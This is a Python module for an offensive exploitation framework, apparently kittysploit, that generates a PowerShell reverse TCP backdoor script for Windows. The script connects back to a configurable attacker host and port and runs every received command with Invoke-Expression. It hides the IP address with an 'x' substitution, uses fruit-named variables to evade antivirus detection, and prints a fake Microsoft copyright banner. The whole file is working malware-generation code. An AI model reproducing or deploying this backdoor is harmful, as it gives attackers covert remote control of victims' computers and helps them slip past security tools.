from kittysploit import *


class Module(Backdoor):
    __info__ = {
        "name": "fruit_shell",
        "description": (
            "Writes a PowerShell reverse TCP line shell using a dotted host/port "
            "encoding (x for octet separators, underscore before port)."
        ),
        "author": "Kittysploit",
        "platform": Platform.WINDOWS,
        "session_type": SessionType.SHELL,
        "listener": "listeners/multi/reverse_tcp",
        "references": [
            "https://github.com/tihanyin/PSSW100AVB/blob/main/ReverseShell_2026_05.ps1"
        ]
    }

    lhost = OptString("127.0.0.1", "Connect-back IP address", True)
    lport = OptPort(4444, "Connect-back TCP port", True)

    def _encoded_apple(self) -> str:
        raw = str(self.lhost).strip()
        return raw.replace(".", "x") + "_" + str(int(self.lport))

    def run(self):
        apple = self._encoded_apple()
        script = f"""$apple = "{apple}"
$apple = $apple -replace 'x', '.'
$banana = $apple.LastIndexOf('_')
$cherry = $apple.Substring(0, $banana)
$date = [int]$apple.Substring($banana + 1)

try {{
    $cherry = New-Object System.Net.Sockets.TcpClient($cherry, $date)
    $date = $cherry.GetStream()
    $elderberry = New-Object IO.StreamWriter($date)
    $elderberry.AutoFlush = $true
    $fig = New-Object IO.StreamReader($date)
    $elderberry.WriteLine("(c) Microsoft Corporation. All rights reserved.`n`n")
    $elderberry.Write((pwd).Path + '> ')

    while ($cherry.Connected) {{
        $grape = $fig.ReadLine()
        if ($grape) {{
            try {{
                $honeydew = Invoke-Expression $grape 2>&1 | Out-String
                $elderberry.WriteLine($grape)
                $elderberry.WriteLine($honeydew)
                $elderberry.Write((pwd).Path + '> ')
            }} catch {{
                $elderberry.WriteLine("ERROR: $_")
                $elderberry.Write((pwd).Path + '> ')
            }}
        }}
    }}
}} catch {{
    exit
}}
"""
        filename = self.random_text(8) + "_fruit.ps1"
        self.write_out_dir(filename, script)
        print_success(f"Generated: {filename}")
        return True
